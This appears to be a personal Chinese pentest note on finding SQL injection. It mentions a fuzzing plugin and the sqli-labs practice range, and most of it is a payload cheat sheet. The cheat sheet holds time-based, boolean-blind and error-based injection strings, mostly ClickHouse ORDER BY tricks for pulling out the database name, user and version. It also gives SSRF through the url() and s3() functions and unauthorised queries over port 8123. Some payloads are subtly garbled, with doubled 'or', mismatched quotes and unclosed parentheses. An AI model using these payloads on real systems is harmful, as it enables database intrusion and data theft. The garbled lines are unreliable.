---
title: SQL注入的寻找
data: 2024-10-22
关联:
  - "[[book/知识笔记/渗透/外网打点/基础漏洞/Sql注入/Sql注入|Sql注入]]"
---
## 基本思路
- fuzz测试程序
- 靠谱的绕过playload
- 测试的靶场

## fuzz测试程序
这里我们选择使用xia_sql
https://github.com/smxiazi/xia_sql

## 测试靶场
这里我们选择经典的sql-labs靶场，并且查找到一个在线的测试网站。https://sqli-labs.bachang.org/
选择第一关，选择基础的playload。顺便熟悉咋使用xia_sql。
![[blog/my-blog/src/images/QQ_1729588016173.png]]
![[blog/my-blog/src/images/QQ_1729587837139.png]]
![[blog/my-blog/src/images/QQ_1729587753821.png]]

```
' or sleep(5)='
```

## Playload
首先我们要明确,在如今框架横行的环境。我们的目标是表字段等,预编译无法防护到的区域。

```
"%20or%20sleep(5)="
'%20or%20sleep(5)='
%df'%20or%20sleep(5)='
1)%20or%20sleep(5)%23
")%20or%20or%20sleep(5)="
')%20or%20or%20sleep(5)='
1))%20or%20or%20sleep(5)%23
"))%20or%20or%20sleep(5)="
'))%20or%20or%20sleep(5)='
-1%20or%20sleep(5)
;waitfor%20delay%20'0:0:5'--
);waitfor%20delay%20'0:0:5'--
```


```
判断注入点
SELECT * from my_new_table order by CAST(create_time AS String); 使用CAST转换字段类型后正常排序
SELECT * from my_new_table order by sleep(1); 延时
SELECT * from my_new_table order by if(1=1,id,1); 当存在字段id时使用if正常排序
SELECT * from my_new_table order by name;select sleep(1);堆叠延时
SELECT * from my_new_table order by (SELECT COUNT(fuzzBits('1', 0.001)) FROM numbers(10000000))
SELECT * from my_new_table order by id,1 不报错
SELECT * from my_new_table order by（1=1?1:1) 和 SELECT * from my_new_table order by if(1,1,1)效果相同，某些情况下如果if被禁用可用来绕过

boole盲注
SELECT * from my_new_table order by toInt64(exp(1)) 不报错
SELECT * from my_new_table order by toInt64(exp(710)) 报错
SELECT id from my_new_table order by toInt64(if(1=2,1,exp(71000)))
SELECT id from my_new_table order by hex(if(mid((select user()),1,1)='d','a','z'))=1
SELECT/**/POSITION('22'/**/IN/**/version()) 判断当前数据版本
SELECT/**/POSITION('22'/**/IN/**/user()) 判断当前用户信息，若括号过滤可用current_user代替

延时注入（sleep和sleepEachRow均可用）
SELECT id from my_new_table order by if(1=2,1,sleep(1)) sql注入延时判断
SELECT id from my_new_table order by if(1=2,1,(SELECT COUNT(fuzzBits('1', 0.001)) FROM numbers(10000000))) sql注入判断
SELECT id from my_new_table order by (select/**/sleep((database()/**/like/**/'%d%')?1:0)) 获取数据库
sleep(version() like’%' 获取数据库版本
sleep(user() like’%’ 获取用户,若括号过滤可用current_user代替
sleepEachRow(user()like'%default%'
if(1=1,1,sleep/**/(if(left(database(),7)='default',3,0)))  获取数据库

报错注入
select data_path from system.databases where 1=1  order by 1=(char(126)||char(126)||CAST((SELECT name from system.databases limit 1 OFFSET 1) AS String)||char(126)||char(126))
'||currentDatabase()||’ 获取当前数据库
'||user()||’   获取当前用户，,若括号过滤可用current_user代替
select currentDatabase() 获取当前数据库
select user() 获取当前用户，,若括号过滤可用current_user代替

SSRF函数利用
s3('https://www.baidu.com',RawBLOB)
SELECT * FROM s3('https://datasets-documentation.s3.eu-west-3.amazonaws.com/aapl_stock.csv','CSVWithNames’) LIMIT 5;
s3('https://www.baidu.com','CSVWithNames'
SELECT * from `url\\\\\\\\x23`(‘https://www.baidu.com',TSV,'column1 String’)
(select/*//**/1,*,1/**/from/*//**/url('https://www.baidu.com',CSV,'column1 String') ) as a
select * from system.clusters 返回数据库集群ip以及端口开放情况
SELECT * from url(http:/192.168.1.1:8123?guery=show tables',CSV,'column1 String’) 利用8123或者8124端口，通过query后拼接sql语句未授权查询数据库信息（理论上是DBA权限）
```

